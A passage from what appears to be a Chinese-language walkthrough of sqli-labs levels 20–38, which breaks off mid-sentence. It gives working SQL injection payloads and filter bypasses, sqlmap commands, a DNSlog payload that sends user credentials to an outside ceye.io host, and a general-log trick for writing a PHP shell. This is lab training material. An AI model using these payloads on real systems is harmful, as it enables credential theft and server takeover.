title="手动cookie注入"></a>手动cookie注入</h3><p>登录，这么多回显，似乎有很多注入方法，尝试过后，只有cookie注入</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021942302.png"></p><p>抓包，Cookie后加单引号</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021942838.png"></p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021942234.png"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27; and extractvalue(1,concat(0x7e,(select database())))#</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021942295.png"></p><h3 id="自动Cookie注入"><a href="#自动Cookie注入" class="headerlink" title="自动Cookie注入"></a>自动Cookie注入</h3><p>抓包，写包（会抓到很多包，不要抓错了，参考下图），在cookie后面加*</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021942837.png"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">python sqlmap.py <span class="hljs-operator">-</span>r E:\Users\CTFtools\sqlmap\bp抓包\<span class="hljs-number">1.</span>txt<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021942226.png"></p><h2 id="Less-21"><a href="#Less-21" class="headerlink" title="Less-21"></a>Less-21</h2><p>一样是cookie注入，抓包，从格式看cookie应该是经过base64编码过了（base64是一种基础的编码方式）</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021942407.png"></p><p>找个<strong>Base64 在线工具</strong><a href="https://base64.us/" title="Base64 在线编码解码 | Base64 加密解密 - Base64.us">Base64 在线编码解码 | Base64 加密解密 - Base64.us</a></p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021942494.png"></p><p>好说，和之前一样，不过我们写的注入语句也应该编码</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021942602.png"></p><p>报错了，考虑到我们用的Dumb’，应该是’)闭合</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021942542.png"></p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021942897.png"></p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021947200.png"></p><p>自动也可以，先加上*</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021942080.png"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">python sqlmap.py <span class="hljs-operator">-</span>r E:\Users\CTFtools\sqlmap\bp抓包\less21.txt <span class="hljs-comment">--tamper base64encode.py</span><br></code></pre></td></tr></table></figure><p>要带个脚本，以便base64编码</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021942990.png"></p><h2 id="Less-22"><a href="#Less-22" class="headerlink" title="Less-22"></a>Less-22</h2><p>和上题基本一样，但用Dumb’不好使，要换成双引号</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021943317.png"></p><p>闭合正好是用双引号</p><h2 id="Less-23"><a href="#Less-23" class="headerlink" title="Less-23"></a>Less-23</h2><p>Get注入</p><p><code>?id=1&#39;</code>，用单引号闭合</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021943954.png"></p><p>有报错，但常规报错注入不太行，说是过滤了注释符</p><p>但是可以参考之前一种情况</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and extractvalue(1,concat(0x7e,(select database()))) and &#x27;</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; =&#x27;</span><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>然后id因为外面还有一层单引号，所以实际是‘1’ and extractvalue(1,concat(0x7e,(select database()))) and ‘1’ &#x3D;’1’，一点毛病没有</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021943181.png"></p><p>联合注入也是可以的</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select 1,2,3&#x27;</span><br></code></pre></td></tr></table></figure><p>或者</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select 1,2,3 or &#x27;</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; = &#x27;</span><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021943285.png"></p><p>这就绕过了过滤</p><p>sqlmap也可以，像之前一样，用-u参数就行</p><h2 id="Less-24"><a href="#Less-24" class="headerlink" title="Less-24"></a>Less-24</h2><p>我们直接在登录或注册界面注入都会被过滤，而且忘记密码界面什么也没有，这个题是二次注入。</p><p>首先我们看到管理员账户，admin，密码是1,但是通常情况下我们是不知道密码的，只能猜测管理员账户的admin。</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021943337.png"></p><p>我们利用带有管理员账号的注册用户名，然后在修改密码的时候达到修改管理员账号密码的效果。</p><p>注册用户名：<code>admin’ or ‘1’=’1</code></p><p>密码为：<code>admin</code>（随便设置），</p><p>注册成功后，登录进去修改密码，将密码改为 123，</p><p>更改后即可发现，admin用户的密码也被改成了123，</p><p>自行脑补一下，<code>update tables set password=’123’ where username=’admin’ or ‘1’=’1’</code>（完美闭合，语句没毛病）</p><p>也可以注册一个账号名叫admin’#。</p><p><code>UPDATE users SET PASSWORD=&#39;111111&#39; where username=&#39;admin&#39; # &#39; and password=&#39;admin原来的密码&#39;</code></p><p>（这个题感觉有些问题，只显示登录成功，重启了好几次也不行，具体思路就是这样）</p><h2 id="Less-25"><a href="#Less-25" class="headerlink" title="Less-25"></a>Less-25</h2><p>估计过滤了or和and，试了试，果然如此</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021943147.png"></p><p>大小写绕过也没啥用</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; AnD extractvalue(1,concat(0x7e,(select database())))--+</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021943119.png"></p><p>可以用变形</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; %26%26 extractvalue(1,concat(0x7e,(select database())))--+</span><br></code></pre></td></tr></table></figure><p>%26%26是url编码，是&amp;&amp;的意思（见下图）</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021943358.png"></p><p>用嵌套也可以（双写绕过），应该是单次过滤</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; ANandD extractvalue(1,concat(0x7e,(select database())))--+</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021943413.png"></p><p>联合查询也是可以的</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; union select 1,2,3--+</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021943699.png"></p><p>我们可以采用双写绕过，information里面涉及or可以写成infoorrmation，password也应该改成passwoorrd。</p><h2 id="Less-25a"><a href="#Less-25a" class="headerlink" title="Less-25a"></a>Less-25a</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><p>这题是整数型注入，不用闭合，过滤和上题相同。</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021943580.png"></p><p>报错注入不好使了，有报错但是报错是固定的，告诉你错了但是不告诉你具体哪里错了。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span> ANandD extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> database())))<span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021943824.png"></p><p>用联合注入，和上题类似（不用闭合）</p><h2 id="Less-26"><a href="#Less-26" class="headerlink" title="Less-26"></a>Less-26</h2><p>将and、or，注释符以及空格给过滤了，双写绕过或者使用&amp;&amp;和||替换。</p><p>常规代替空格的字符：</p><p><code>%09</code> TAB 键（水平）</p><p><code>%0a</code> 新建一行</p><p><code>%0b</code> TAB 键（垂直）</p><p><code>%0c</code> 新的一页</p><p><code>%0d</code> return 功能</p><p><code>%a0</code> 空格</p><p><code>/**/</code> 注释</p><p>这题基本上把所有可替代空格的都过滤了。但是空格的还可以用括号代替。</p><p>可以用||加报错注入</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;||extractvalue(1,concat(0x7e,(SelEct(database()))))||&#x27;</span><span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021943405.png"></p><p>也可以用联合注入（%00截断），注意联合注入不能用||’0闭合</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;union(select(1),(2),(3));%00</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021943318.png"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">0</span><span class="hljs-string">&#x27;union(select(1),(2),(select(database())));%00</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021943253.png"></p><p>……</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">0</span><span class="hljs-string">&#x27;union(select(1),(2),(group_concat(username,&#x27;</span><span class="hljs-operator">~</span><span class="hljs-string">&#x27;,passwoorrd))from(users));%00</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021943975.png"></p><h2 id="Less-26a"><a href="#Less-26a" class="headerlink" title="Less-26a"></a>Less-26a</h2><p>用’)闭合，有报错但是报错是固定的，报错注入不好使</p><p>用联合注入，和上题类似</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">0</span><span class="hljs-string">&#x27;)union(select(1),(2),(select(database())));%00</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021943950.png"></p><h2 id="Less-27"><a href="#Less-27" class="headerlink" title="Less-27"></a>Less-27</h2><p>union、select、空格以及注释符都会被过滤</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021943666.png"></p><p>我们可以大小写绕过以及重写绕过，空格可以用其他符号代替，例如（）、%09等。</p><p>报错注入</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;||extractvalue(1,concat(0x7e,(SelEct(database()))))||&#x27;</span><span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021943637.png"></p><p>联合注入也可以（参考图片底部显示的语句）</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">0</span><span class="hljs-string">&#x27;%09UnIoN%09SelEcT%091,2,(SelEcT(database()));%00</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021943338.png"></p><h2 id="Less-27a"><a href="#Less-27a" class="headerlink" title="Less-27a"></a>Less-27a</h2><p>用”闭合，有报错但是报错也是固定的，报错注入不好使</p><p>联合注入，和上题类似</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">0</span>&quot;%09UnIoN%09SelEcT%091,2,(SelEcT(database()));%00<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021943919.png"></p><h2 id="Less-28"><a href="#Less-28" class="headerlink" title="Less-28"></a>Less-28</h2><p>闭合是’)，过滤了空格，当union select相邻出现时一起过滤。</p><p>有报错但是报错是固定的，报错注入不好使</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021944798.png"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">0</span><span class="hljs-string">&#x27;)uNIOn(sELEct(1),(2),(select(database())));%00</span><br></code></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">0</span><span class="hljs-string">&#x27;)union(select(1),(2),(select(database())));%00</span><br></code></pre></td></tr></table></figure><p>也好使，应该是用（把它们断开了，识别不了。</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021944507.png"></p><h2 id="Less-28a"><a href="#Less-28a" class="headerlink" title="Less-28a"></a>Less-28a</h2><p>闭合不变，空格不被过滤</p><p>报错注入还是不好使，联合注入那就随便写了，注意union select不要相邻出现（可以直接照搬上题）</p><h2 id="Less-29"><a href="#Less-29" class="headerlink" title="Less-29"></a>Less-29</h2><h3 id="手动绕过防火墙"><a href="#手动绕过防火墙" class="headerlink" title="手动绕过防火墙"></a>手动绕过防火墙</h3><p>这里说这是世界上最好的防火墙</p><p>看我操作</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021944466.png"></p><p>二十九关就是会对输入的参数进行校验是否为数字，但是在对参数值进行校验之前的提取时候只提取了第一个id值，其余的没有校验。如果我们有两个id参数，第一个id参数应是正常数字，第二个id参数可以进行sql注入。</p><p>查看源代码，发现原来是：get提交的参数如果重名则以最后一个为准，所以sql语句在接受相同参数时候接受的是后面的参数值，但是验证id是否是数字却只是验证了第一个id参数，所以可以在后面的参数注入。</p><p>实际过程中可能没机会看源代码，这里是培养我们尝试多个参数的意识</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-operator">&amp;</span> id<span class="hljs-operator">=</span><span class="hljs-number">0</span><span class="hljs-string">&#x27; union select 1,2,3--+</span><br></code></pre></td></tr></table></figure><p>（#注释不好使，只好用–+）</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021944702.png"></p><p>报错注入也可以</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-operator">&amp;</span> id<span class="hljs-operator">=</span><span class="hljs-number">0</span><span class="hljs-string">&#x27; and extractvalue(1,concat(0x7e,(select database())))--+</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021944529.png"></p><h3 id="自动绕过"><a href="#自动绕过" class="headerlink" title="自动绕过"></a>自动绕过</h3><p>直接就扫出来了</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">python sqlmap.py <span class="hljs-operator">-</span>u http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span>localhost<span class="hljs-operator">/</span>sqli<span class="hljs-operator">-</span>labs<span class="hljs-operator">/</span>Less<span class="hljs-number">-29</span><span class="hljs-operator">/</span>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-comment">--dbms mysql –batch</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021944213.png"></p><p>当然也可以用参数–tamper</p><h2 id="Less-30"><a href="#Less-30" class="headerlink" title="Less-30"></a>Less-30</h2><p>第30关跟29关差不多，只不过30关用双引号闭合</p><p>Payload:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-operator">&amp;</span> id<span class="hljs-operator">=</span><span class="hljs-number">0</span>&quot;union select 1,2,3--+<br></code></pre></td></tr></table></figure><p>用sqlmap要升一升level，–level 3就可以</p><h2 id="Less-31"><a href="#Less-31" class="headerlink" title="Less-31"></a>Less-31</h2><p>第31关跟30关差不多，只不过31关用”)闭合</p><p>Payload:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-operator">&amp;</span> id<span class="hljs-operator">=</span><span class="hljs-number">0</span>&quot;)union select 1,2,3--+<br></code></pre></td></tr></table></figure><p>用sqlmap要升一升level，–level 3就可以</p><h2 id="Less-32"><a href="#Less-32" class="headerlink" title="Less-32"></a>Less-32</h2><p>使用preg_replace函数将 斜杠，单引号和双引号过滤了，如果输入id&#x3D;1”会变成id&#x3D;1\“,使得引号不起作用，但是可以注意到数据库使用了gbk编码。这里我们可以采用宽字节注入。</p><p>因为过滤方法主要就是在敏感字符前面添加 反斜杠 \，所以这里想办法干掉反斜杠即可。具体利用的话我们可以用%df 吃掉 \（%5c）</p><p>因为urlencode(\‘) &#x3D; %5c%27，如果我们在 %5c%27前面添加 %df，形 成%df%5c%27，MySQL 在 GBK 编码方式的时候会将两个字节当做一个汉字，这个时候就把 %df%5c当做是一个汉字，%27(单引号)则作为一个单独的符号在外面，同时也就达到了我们的目的。</p><p>联合注入</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">0</span><span class="hljs-operator">%</span>df<span class="hljs-operator">%</span><span class="hljs-number">27</span><span class="hljs-keyword">union</span><span class="hljs-operator">%</span><span class="hljs-number">20</span><span class="hljs-keyword">select</span><span class="hljs-operator">%</span><span class="hljs-number">201</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span><span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021944504.png"></p><p>后续爆字段时候需要用的表名加了引号，只需将表名换成十六进制编码就行，</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">0</span><span class="hljs-operator">%</span>df<span class="hljs-operator">%</span><span class="hljs-number">27</span><span class="hljs-operator">%</span><span class="hljs-number">20</span><span class="hljs-keyword">union</span><span class="hljs-operator">%</span><span class="hljs-number">20</span><span class="hljs-keyword">select</span><span class="hljs-operator">%</span><span class="hljs-number">201</span>,group_concat(column_name),<span class="hljs-number">3</span><span class="hljs-operator">%</span><span class="hljs-number">20</span><span class="hljs-keyword">from</span><span class="hljs-operator">%</span><span class="hljs-number">20</span>information_schema.columns<span class="hljs-operator">%</span><span class="hljs-number">20</span><span class="hljs-keyword">where</span><span class="hljs-operator">%</span><span class="hljs-number">20</span>table_schema<span class="hljs-operator">=</span>database() <span class="hljs-keyword">and</span> table_name<span class="hljs-operator">=</span><span class="hljs-number">0x7573657273</span><span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021944893.png"></p><p>报错注入</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">0</span><span class="hljs-operator">%</span>df<span class="hljs-operator">%</span><span class="hljs-number">27</span><span class="hljs-keyword">and</span><span class="hljs-operator">%</span><span class="hljs-number">20</span>extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span><span class="hljs-operator">%</span><span class="hljs-number">20</span>database())))<span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021944135.png"></p><h2 id="Less-33"><a href="#Less-33" class="headerlink" title="Less-33"></a>Less-33</h2><p>本关使用PHP中的addslashes()函数，addslashes()函数作用是返回在预定义字符之前添加反斜杠的字符串。预定义字符如下：</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021944962.png"></p><p>由此看来与32关过滤防御方式基本是一样的，payload不变。</p><h2 id="Less-34"><a href="#Less-34" class="headerlink" title="Less-34"></a>Less-34</h2><p>POST注入+宽字节注入</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021944603.png"></p><p>抓包、改包、放包</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-operator">%</span>df<span class="hljs-string">&#x27; union select 1,2--+</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021944680.png"></p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021944590.png"></p><p>报错注入也行</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-operator">%</span>df<span class="hljs-string">&#x27; and extractvalue(1,concat(0x7e,(select database())))--+</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021944283.png"></p><h2 id="Less-35"><a href="#Less-35" class="headerlink" title="Less-35"></a>Less-35</h2><p>数字型注入，不需要闭合。</p><p>使用addslashes函数对于输入的内容进行转义，但是id参数没有引号，主要影响在与后续爆字段时候需要用的表名加了引号，只需将表名换成十六进制编码就行，直接使用联合查询就可以了</p><p>Payload：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">0</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>#<br></code></pre></td></tr></table></figure><h2 id="Less-36"><a href="#Less-36" class="headerlink" title="Less-36"></a>Less-36</h2><p>使用mysql_real_escape_string函数对于特殊字符进行转义。id参数是单引号，payload和前面三十二关一样</p><h2 id="Less-37"><a href="#Less-37" class="headerlink" title="Less-37"></a>Less-37</h2><p>三十七关是post提交，使用mysql_real_escape_string函数对于账户和密码都进行转义，使用宽字节注入就行。payload和三十四关一样。</p><h2 id="Less-38"><a href="#Less-38" class="headerlink" title="Less-38"></a>Less-38</h2><h3 id="常规堆叠注入"><a href="#常规堆叠注入" class="headerlink" title="常规堆叠注入"></a>常规堆叠注入</h3><p>下面就开启堆叠注入了</p><p>三十八关其实就是单引号闭合，使用正常单引号闭合就可以进行注入，不过这里可以有另外一种注入就是堆叠注入，因为存在mysqli_multi_query函数，该函数支持多条sql语句同时进行。</p><p>其实直接用联合注入就可以，但是堆叠注入有自己的独特优势，比如建立新用户、删库等，这里还是要尝试一下。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">0</span><span class="hljs-string">&#x27; union select 1,2,3;insert into users(id,username,password) values (&#x27;</span><span class="hljs-number">25</span><span class="hljs-string">&#x27;,&#x27;</span>myname<span class="hljs-string">&#x27;,&#x27;</span>meaning<span class="hljs-string">&#x27;)--+</span><br></code></pre></td></tr></table></figure><p>只演示创建新用户（用户名啥的可以自己随便写），就不删库了，后续做题还得用，但用法都是一样的</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021944269.png"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">25</span><span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><p>成功写入</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021944784.png"></p><p>DNSlog外带配合堆叠注入也是可以的，</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;;select load_file(concat(&#x27;</span>\\\\<span class="hljs-string">&#x27;,(select hex(concat_ws(&#x27;</span><span class="hljs-operator">~</span><span class="hljs-string">&#x27;,username,password)) from users limit 0,1),&#x27;</span>.gvc791.ceye.io\\abc<span class="hljs-string">&#x27;))--+</span><br></code></pre></td></tr></table></figure><h3 id="开启日志-Getshell"><a href="#开启日志-Getshell" class="headerlink" title="开启日志 Getshell"></a>开启日志 Getshell</h3><p>注意：这一部分知识需要有文件上传漏洞的基础，不属于SQL注入的知识</p><p>需要条件：</p><ol><li>Web 的物理路径（注意是物理路径，这里我们用的是phpstudy，地址应该是<code>E:\PhPstudy\phpstudy\_pro\WWW\sqli-labs</code>，phpstudy所在的地址不一定一样，根据自己的来）</li><li>MySQL 可以读写 Web 目录（需要注入手动开启）</li><li>Windows 成功率 高于 Linux。</li></ol><p>首先进入mysql查看当前的日志的相关配置：默认是没有开启的（OFF）</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SHOW</span> VARIABLES <span class="hljs-keyword">LIKE</span> <span class="hljs-string">&#x27;general%&#x27;</span>;<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021944578.png"></p><p>这里尝试注入的时候手动开启：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;;set global general_log = &quot;ON&quot;;set global general_log_file=&#x27;</span>E:\\PhPstudy\\phpstudy_pro\\WWW\\sqli<span class="hljs-operator">-</span>labs\\shell.php<span class="hljs-string">&#x27;;--+</span><br></code></pre></td></tr></table></figure><p>这里的general_log_file可以根据自己的web物理路径来写，要能找到，最好写在sqli-labs目录下。</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021944357.png"></p><p>尝试写入phpinfo()：</p><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xquery"><span class="hljs-built_in">?id</span>=<span class="hljs-number">1</span><span class="hljs-string">&#x27;;select &#x27;</span>&lt;<span class="hljs-meta">%3fphp</span>+phpinfo()<span class="hljs-meta">%3b</span><span class="hljs-meta">%3f</span>&gt;<span class="hljs-string">&#x27;--+</span><br></code></pre></td></tr></table></figure><p>日志里面就会记录 ， 